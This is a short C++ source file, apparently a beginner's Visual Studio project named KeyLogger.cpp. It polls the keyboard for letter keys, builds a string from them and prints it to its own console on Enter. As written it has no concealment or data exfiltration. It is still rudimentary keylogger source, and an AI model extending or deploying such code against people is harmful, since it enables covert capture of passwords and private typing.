// KeyLogger.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <Windows.h>
#include <iostream>
using namespace std;



//string isNumber(DWORD word) { //Checks if the key stroke is a number or a letter
//	
//
//}
string currentSentence = "";
void findLetterTyped() {

	char alphabet[26] = { 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z' };
	
	DWORD word = 0x41;
	for (int i = 0; i < 26; i++) {
		if (GetAsyncKeyState(word) & 1) { //Loops through every single letter until it finds the one with the least bit number changed 
			currentSentence += alphabet[i];
		}

		word++;
		if (GetAsyncKeyState(VK_RETURN) & 1) {
			cout << currentSentence << endl;
			currentSentence = "";
			return;
		}
	}

}


int main()
{
	while (1) {
		Sleep(1);
		findLetterTyped();
	}
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
